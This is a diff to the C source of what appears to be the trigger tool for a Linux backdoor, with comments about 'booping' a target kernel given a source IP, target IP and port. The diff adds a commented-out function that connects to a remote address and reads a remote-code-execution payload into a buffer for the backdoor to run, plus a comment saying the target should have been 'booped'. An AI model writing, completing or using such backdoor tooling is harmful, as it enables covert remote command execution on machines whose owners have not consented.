@@ -31,6 +31,32 @@
 #include "tcp.h"
 // clang-format on
 
+// int handlesndrce(char dial[INET_ADDRSTRLEN], char *rce) {
+//   printf(" ** Boop: %s\n ", dial);
+//   struct sockaddr_in daddr;
+//   daddr.sin_family = AF_INET;
+//   daddr.sin_port = htons(PORT);
+//   if (inet_pton(AF_INET, dial, &daddr.sin_addr) != 1) {
+//     printf(" XX Destination IP configuration failed.\n");
+//     return 1;
+//   }
+//   int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+//   if (revsock == -1) {
+//     printf(" XX Socket creation failed\n");
+//     return 1;
+//   }
+//   if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
+//     printf(" XX Connection SOCK_STREAM refused.\n");
+//     return 1;
+//   }
+//
+//   char buffer[MAX_RCE_SIZE];
+//   read(revsock, buffer, MAX_RCE_SIZE);
+//   close(revsock);
+//   strncpy(rce, buffer, MAX_RCE_SIZE);
+//   return 0;
+// }
+
 // [trigger] <source-ip> <target-ip> <target-port>
 //
 // My research shows that with Linux 5.17 kernels
@@ -198,6 +224,8 @@ int main(int argc, char **argv) {
          argv[3]);
   close(sock3);
   // ===========================================================================
+
+  // We get here we should have "booped" by now!
 
   return 0;
 }
